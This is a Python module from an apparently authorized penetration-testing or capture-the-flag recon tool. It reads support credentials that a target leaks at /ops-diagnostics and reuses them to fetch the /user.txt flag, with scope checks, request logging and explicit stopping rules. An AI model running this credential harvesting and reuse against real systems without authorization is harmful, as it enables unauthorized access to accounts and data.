#!/usr/bin/env python3
"""
recon_engine.adapters.foothold -- follows evidence already gathered
(vhost + route proof from the signal adapter's ROUTE command) to the
one explicitly authorized foothold request, and stops.

rules-of-engagement.md permits exactly one thing beyond discovery:
"authentication with credentials found inside the assigned target,"
with a hard proof limit of "read the assigned user.txt; stop before
privilege escalation." This module is built to make that boundary
structural, not just a docstring promise:

  - It NEVER runs unless a vhost and route_key are already sitting in
    the checkpoint from prior discovery -- it does not scan for
    credentials, brute-force anything, or guess a vhost. If the
    evidence isn't there yet, this adapter does nothing.
  - It makes exactly two requests, in a fixed order, with no branching
    that could turn into a loop: GET /ops-diagnostics (to read the
    credentials the target itself hands out) and GET /user.txt (using
    those credentials and the route proof). There is no code path here
    that tries a second set of credentials, a different path, or any
    request beyond these two.
  - A failed /user.txt attempt (401/403) is reported honestly and the
    function returns -- it is not retried with different values, since
    that would cross from "using the evidence we have" into "guessing,"
    which is exactly what's prohibited.
  - Nothing past user.txt is ever requested. There is no third request
    in this module, on purpose.
"""

from __future__ import annotations

import base64
import http.client
import json
import time
from pathlib import Path
from typing import Optional

from ..checkpoint import Checkpoint
from ..fingerprint import compute_fingerprint
from ..json_parser import parse_json
from ..ledger import RequestLedger
from ..raw_capture import write_raw
from ..scope_guard import ScopeGuard, ScopeViolation


class FootholdError(Exception):
    """Evidence for the foothold isn't available yet, or the
    authorized request itself failed. Never raised for "credentials
    didn't work, let's try something else" -- there is no "something
    else" in this module."""


class FootholdEvidenceMissing(FootholdError):
    """No vhost/route_key in the checkpoint yet -- there is nothing to
    follow. Not a failure; just "not ready.\""""


def pursue_foothold(
    guard: ScopeGuard,
    host: str,
    port: int,
    output_dir: Path,
    ledger: RequestLedger,
    checkpoint: Checkpoint,
    timeout: float = 5.0,
) -> dict:
    """Follow already-gathered evidence to the authorized foothold.
    Requires checkpoint.get_meta("vhost") and .get_meta("route_key")
    to already be set (by the signal adapter's ROUTE command) --
    raises FootholdEvidenceMissing if either is absent, rather than
    guessing or scanning for them here.

    Returns a summary dict with the flag if one was obtained. Raises
    FootholdError if the authorized request itself failed (wrong
    credentials, wrong route proof, network error) -- this is reported
    honestly, not retried with different values.
    """
    vhost = checkpoint.get_meta("vhost")
    route_key = checkpoint.get_meta("route_key")
    if not vhost or not route_key:
        raise FootholdEvidenceMissing(
            "no vhost/route_key in checkpoint yet -- run signal discovery's "
            "ROUTE command first; this adapter does not discover them itself"
        )

    dedup_key = f"foothold:{vhost}"
    if checkpoint.is_done(dedup_key):
        cached = checkpoint.get(dedup_key)
        return cached if cached is not None else {"flag": None, "success": False}

    raw_dir = output_dir / "raw" / "http"
    normalized_dir = output_dir / "normalized"
    raw_dir.mkdir(parents=True, exist_ok=True)
    normalized_dir.mkdir(parents=True, exist_ok=True)
    normalized_path = normalized_dir / "assets.jsonl"

    # Step 1 of 2, and no more: read the credentials the target itself
    # hands out at /ops-diagnostics for the correct vhost.
    diag_record, diag_body = _make_request(
        guard, host, port, "/ops-diagnostics", vhost, {}, raw_dir, ledger,
        purpose="foothold: read credentials", timeout=timeout,
    )
    with open(normalized_path, "a") as f:
        f.write(json.dumps(diag_record, sort_keys=True) + "\n")

    if diag_record["status"] != 200:
        raise FootholdError(
            f"/ops-diagnostics returned {diag_record['status']}, not 200 -- "
            "cannot read credentials; not retrying with anything else"
        )

    diag_parsed = parse_json(diag_body)
    username = diag_parsed.get_path("support_user")
    password = diag_parsed.get_path("support_password")
    if username is None or password is None:
        detail = diag_parsed.error or "response parsed but didn't contain support_user/support_password"
        raise FootholdError(f"/ops-diagnostics response didn't contain usable credentials: {detail}")

    # Step 2 of 2, and no more: the one authorized foothold request.
    auth_value = "Basic " + base64.b64encode(f"{username}:{password}".encode()).decode()
    user_txt_headers = {"Authorization": auth_value, "X-Route-Key": route_key}
    flag_record, flag_body = _make_request(
        guard, host, port, "/user.txt", vhost, user_txt_headers, raw_dir, ledger,
        purpose="foothold: authorized flag retrieval", timeout=timeout,
    )
    with open(normalized_path, "a") as f:
        f.write(json.dumps(flag_record, sort_keys=True) + "\n")

    if flag_record["status"] != 200:
        checkpoint.mark_done(dedup_key, {"flag": None, "success": False})
        raise FootholdError(
            f"/user.txt returned {flag_record['status']} using credentials read "
            "from /ops-diagnostics and the route proof from ROUTE -- the "
            "evidence didn't work; not attempting anything else"
        )

    flag = flag_body.decode("utf-8", errors="replace").strip()

    summary = {
        "vhost": vhost,
        "route_key": route_key,
        "username": username,
        "flag": flag,
        "success": True,
        "ops_diagnostics_record": diag_record["source_file"],
        "user_txt_record": flag_record["source_file"],
    }
    checkpoint.mark_done(dedup_key, summary)
    return summary


def _make_request(
    guard: ScopeGuard,
    host: str,
    port: int,
    path: str,
    vhost: str,
    extra_headers: dict,
    raw_dir: Path,
    ledger: RequestLedger,
    purpose: str,
    timeout: float,
) -> "tuple[dict, bytes]":
    """One request, no retries beyond a single transient-failure retry
    (matching every other adapter's timeout handling) -- never retried
    for a 4xx response, since that's a real answer, not a glitch."""
    runtime_id = guard.assignment.get("runtime_id")

    for attempt in (1, 2):
        try:
            guard.check(host, port)
        except ScopeViolation as exc:
            ledger.record(
                purpose=purpose, host=host, port=port, protocol="http",
                attempt=attempt, scope_verdict=f"denied: {exc}", result="not sent",
                runtime_id=runtime_id,
            )
            raise

        headers = {"Host": vhost, "User-Agent": "recon-engine/foothold", **extra_headers}
        started_at = time.time()
        try:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
            try:
                conn.request("GET", path, headers=headers)
                resp = conn.getresponse()
                status, reason = resp.status, resp.reason
                resp_headers = resp.getheaders()
                body = resp.read()
            finally:
                conn.close()
        except (OSError, http.client.HTTPException) as exc:
            ledger.record(
                purpose=purpose, host=host, port=port, protocol="http",
                attempt=attempt, scope_verdict="approved", result=f"error: {exc}",
                runtime_id=runtime_id,
            )
            if attempt == 1:
                time.sleep(0.5)
                continue
            raise FootholdError(f"GET {path} (Host: {vhost}) failed: {exc}")

        finished_at = time.time()
        path_slug = path.strip("/").replace("/", "_") or "root"
        raw_content = f"GET {path} HTTP/1.1\r\n".encode()
        for name, value in headers.items():
            raw_content += f"{name}: {value}\r\n".encode()
        raw_content += b"\r\n"
        raw_content += f"HTTP/1.1 {status} {reason}\r\n".encode()
        for name, value in resp_headers:
            raw_content += f"{name}: {value}\r\n".encode()
        raw_content += b"\r\n" + body
        raw_path = write_raw(raw_dir / f"{host}_{port}_{vhost}_{path_slug}.raw", raw_content)

        ledger.record(
            purpose=purpose, host=host, port=port, protocol="http",
            attempt=attempt, scope_verdict="approved", result=f"HTTP {status}",
            runtime_id=runtime_id,
        )

        record = {
            "observed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(started_at)),
            "target": f"{host}:{port}",
            "port": port,
            "protocol": "http",
            "service": "http",
            "source_tool": "recon_engine.foothold",
            "source_file": raw_path.name,
            "confidence": "high",
            "notes": purpose,
            "path": path,
            "vhost": vhost,
            "status": status,
            "length": len(body),
            "duration_s": round(finished_at - started_at, 4),
            "attempts": attempt,
        }
        record["fingerprint"] = compute_fingerprint(record)
        return record, body

    raise FootholdError(f"GET {path} (Host: {vhost}) failed after retry")
